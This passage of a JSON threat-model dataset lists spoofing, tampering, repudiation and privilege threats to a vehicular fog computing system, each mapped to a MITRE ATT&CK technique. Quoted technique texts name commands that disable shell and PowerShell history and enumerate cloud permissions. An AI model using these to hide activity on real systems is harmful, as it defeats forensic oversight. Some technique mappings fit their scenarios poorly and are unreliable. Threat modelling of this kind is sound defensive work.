            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative privileges on fog nodes through exploiting a software vulnerability.",
            "Assumptions": [
                {
                    "Assumption": "Fog node software contains exploitable vulnerabilities.",
                    "Role": "Software Developer",
                    "Condition": "Unpatched software or use of deprecated libraries."
                },
                {
                    "Assumption": "Administrative access controls are insufficient.",
                    "Role": "System Administrator",
                    "Condition": "Weak or default passwords."
                }
            ],
            "Potential Impact": "Full control over fog nodes, allowing the attacker to manipulate or disrupt data processing and traffic management.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability",
                "fog node",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A compromised smart vehicle escalates privileges to control other vehicles within the VFC system.",
            "Assumptions": [
                {
                    "Assumption": "Vehicles do not have strict access control mechanisms.",
                    "Role": "Vehicle Software Developer",
                    "Condition": "Weak separation of privileges within vehicle systems."
                },
                {
                    "Assumption": "Inter-vehicle communication lacks proper authentication.",
                    "Role": "System Designer",
                    "Condition": "Absence of robust authentication protocols."
                }
            ],
            "Potential Impact": "Unauthorized control over other vehicles, potentially leading to traffic accidents or intentional misuse of vehicle functions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vehicle system",
                "access control",
                "communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker gains privileged access to cloud services through compromised credentials.",
            "Assumptions": [
                {
                    "Assumption": "Credentials are not stored or transmitted securely.",
                    "Role": "Cloud Security Team",
                    "Condition": "Use of weak encryption or plain text storage."
                },
                {
                    "Assumption": "Multi-factor authentication (MFA) is not enforced.",
                    "Role": "System Architect",
                    "Condition": "Single-factor authentication in place."
                }
            ],
            "Potential Impact": "Complete access to critical data and services, enabling manipulation or disruption of the entire VFC system.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud services",
                "credentials",
                "multi-factor authentication"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "3",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a smart vehicle to send falsified data to fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes trust incoming data from vehicles without strong authentication.",
                    "Role": "Fog Node",
                    "Condition": "When relying on basic or no authentication mechanisms for vehicle communication"
                },
                {
                    "Assumption": "Attackers have access to tools to spoof vehicle identities.",
                    "Role": "Attacker",
                    "Condition": "When attackers can manipulate vehicle communication protocols"
                },
                {
                    "Assumption": "Vehicles and fog nodes communicate over insecure channels.",
                    "Role": "Vehicle and Fog Node",
                    "Condition": "When communication lacks encryption or secure channels"
                }
            ],
            "Potential Impact": "Unauthorized vehicles could introduce false data, disrupting traffic management and vehicle behavior.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity",
                "vehicle",
                "injection",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a fog node to intercept and manipulate vehicle data.",
            "Assumptions": [
                {
                    "Assumption": "Vehicles do not verify the identity of fog nodes they communicate with.",
                    "Role": "Vehicle",
                    "Condition": "When relying on implicit trust for fog node identities"
                },
                {
                    "Assumption": "Attackers can physically or virtually impersonate fog nodes.",
                    "Role": "Attacker",
                    "Condition": "When attackers have access to fog node hardware or communication channels"
                },
                {
                    "Assumption": "Fog node addresses are easily discoverable by attackers.",
                    "Role": "Attacker",
                    "Condition": "When fog node deployment details are publicly or easily accessible"
                }
            ],
            "Potential Impact": "Interception and potential manipulation of sensitive vehicle data, leading to privacy breaches and incorrect traffic information.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "fog node",
                "man-in-the-middle",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates cloud service endpoints to redirect data from fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes assume all cloud endpoints are legitimate.",
                    "Role": "Fog Node",
                    "Condition": "When lacking robust endpoint authentication measures"
                },
                {
                    "Assumption": "Attackers can reroute or intercept network traffic to/from fog nodes.",
                    "Role": "Attacker",
                    "Condition": "When exploiting network vulnerabilities"
                },
                {
                    "Assumption": "Cloud service endpoints are not locked to specific IPs or authentication tokens.",
                    "Role": "Cloud Service",
                    "Condition": "When using flexible but insecure service bindings"
                }
            ],
            "Potential Impact": "Sensitive data could be intercepted or redirected, leading to data breaches and potential data loss.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "cloud",
                "redirection",
                "data loss",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and alters data sent from a vehicle to a fog node.",
            "Assumptions": [
                {
                    "Assumption": "Communication between vehicles and fog nodes is not encrypted.",
                    "Role": "Vehicle and Fog Node",
                    "Condition": "When encryption protocols are not implemented"
                },
                {
                    "Assumption": "Attacker has access to the communication channel.",
                    "Role": "Attacker",
                    "Condition": "When network security is compromised"
                },
                {
                    "Assumption": "Data integrity checks are not performed by fog nodes.",
                    "Role": "Fog Node",
                    "Condition": "When fog nodes do not validate data sources"
                }
            ],
            "Potential Impact": "Corrupted data leading to incorrect decisions by fog nodes, impacting real-time traffic management.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "vehicle",
                "data integrity",
                "network",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to a fog node and alters its software.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes lack physical security controls.",
                    "Role": "Fog Node",
                    "Condition": "When deployed in accessible locations without protection"
                },
                {
                    "Assumption": "Software on fog nodes is not tamper-proof or regularly checked.",
                    "Role": "Fog Node",
                    "Condition": "When lacking continuous integrity monitoring"
                },
                {
                    "Assumption": "Attacker has physical access to the fog node.",
                    "Role": "Attacker",
                    "Condition": "When fog nodes are physically insecure"
                }
            ],
            "Potential Impact": "Altered software could process data incorrectly, send false alerts, or disrupt communication.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "fog node",
                "physical access",
                "software integrity",
                "malware"
            ],
            "mitre_technique": {
                "name": "Create or Modify System Process",
                "description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.(Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.(Citation: OSX Malware Detection)  ",
                "id": "attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5",
                "technique_id": "T1543"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data stored on a fog node for unauthorized use.",
            "Assumptions": [
                {
                    "Assumption": "Data stored on fog nodes is not encrypted or hashed.",
                    "Role": "Fog Node",
                    "Condition": "When data security protocols are not enforced"
                },
                {
                    "Assumption": "Attacker has access to fog node storage.",
                    "Role": "Attacker",
                    "Condition": "When attacker can bypass or exploit storage security"
                },
                {
                    "Assumption": "Fog nodes do not log or monitor access to their storage.",
                    "Role": "Fog Node",
                    "Condition": "When lacking comprehensive logging mechanisms"
                }
            ],
            "Potential Impact": "Altered data leading to integrity issues and potential misuse of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data storage",
                "fog node",
                "integrity",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
                "technique_id": "T1565.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny sending specific data to a fog node, and there's no way to verify the claim.",
            "Assumptions": [
                {
                    "Assumption": "No logging or tracking of data transmission between vehicles and fog nodes.",
                    "Role": "Fog Node",
                    "Condition": "When lacking comprehensive logging mechanisms"
                },
                {
                    "Assumption": "Data transmissions are not signed or authenticated.",
                    "Role": "Vehicle",
                    "Condition": "When vehicles do not sign data they send"
                },
                {
                    "Assumption": "Attacker can exploit the lack of non-repudiation mechanisms.",
                    "Role": "Attacker",
                    "Condition": "When able to capitalize on system weaknesses"
                }
            ],
            "Potential Impact": "Difficulty in auditing and holding parties accountable for actions, leading to potential security policy issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "data transmission",
                "non-repudiation",
                "logging",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates logs on fog nodes to cover their tracks.",
            "Assumptions": [
                {
                    "Assumption": "Fog node logs are not securely stored or protected.",
                    "Role": "Fog Node",
                    "Condition": "When logs are stored in an unsecured manner"
                },
                {
                    "Assumption": "No tamper detection mechanisms for logs.",
                    "Role": "Fog Node",
                    "Condition": "When lacking security controls for log integrity"
                },
                {
                    "Assumption": "Attacker has access to fog node systems.",
                    "Role": "Attacker",
                    "Condition": "When attacker bypasses physical or digital safeguards"
                }
            ],
            "Potential Impact": "Inability to detect security incidents and analyze attacker behavior, impeding incident response.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "fog node",
                "forensics",
                "tamper detection"
            ],
            "mitre_technique": {
                "name": "Impair Command History Logging",
                "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).",
                "id": "attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59",
                "technique_id": "T1562.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Cloud services deny receiving data from fog nodes, and there's no audit trail.",
            "Assumptions": [
                {
                    "Assumption": "Data transfer logs between fog nodes and cloud services are not maintained.",
                    "Role": "Cloud Service",
                    "Condition": "When lacking detailed transfer logs"
                },
                {
                    "Assumption": "No receipts or acknowledgments for data transferred.",
                    "Role": "Fog Node",
                    "Condition": "When systems do not generate and store acknowledgments"
                },
                {
                    "Assumption": "Attackers can claim transactions didn't happen.",
                    "Role": "Attacker",
                    "Condition": "When exploiting absence of traceable records"
                }
            ],
            "Potential Impact": "Loss of accountability and inability to verify data processing or transfer, leading to policy and operational flaws.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "cloud",
                "data transfer",
                "audit trail",
                "logging"
            ],
            "mitre_technique": {
                "name": "Cloud Groups",
                "description": "Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.\n\nWith authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts (Citation: Microsoft Msolrole)(Citation: GitHub Raindance).\n\nAzure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command <code>az ad user get-member-groups</code> will list groups associated to a user account for Azure while the API endpoint <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group resources available to a user for Google.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)(Citation: Google Cloud Identity API Documentation) In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies` allow users to enumerate the policies attached to a role.(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)\n\nAdversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code> API (Citation: AWS Get Bucket ACL). Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.",
                "id": "attack-pattern--16e94db9-b5b1-4cd0-b851-f38fbd0a70f2",
                "technique_id": "T1069.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted data flows between vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Data flows are transmitted in clear text.",
                    "Role": "Vehicle and Fog Node",
                    "Condition": "When encryption protocols are not in place"
                },
                {
                    "Assumption": "Attacker has access to the communication channel.",
                    "Role": "Attacker",
                    "Condition": "When network security is compromised"
                },
                {
                    "Assumption": "Sensitive data is regularly transmitted.",
                    "Role": "Vehicle",
                    "Condition": "When vehicles send critical data over insecure channels"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data, including vehicle status and road conditions.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "unencrypted",
                "network",
                "interception",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Insufficient access controls on fog nodes lead to unauthorized data access.",
            "Assumptions": [
                {
                    "Assumption": "Access controls are weak or non-existent on fog node systems.",
                    "Role": "Fog Node",
                    "Condition": "When lacking stringent access policies"
                },
                {
                    "Assumption": "Sensitive data is stored on fog nodes.",
                    "Role": "Fog Node",
                    "Condition": "When relevant data is stored locally"
                },
                {
                    "Assumption": "Attacker can bypass existing security mechanisms.",
                    "Role": "Attacker",
                    "Condition": "When exploiting system vulnerabilities"
                }
            ],
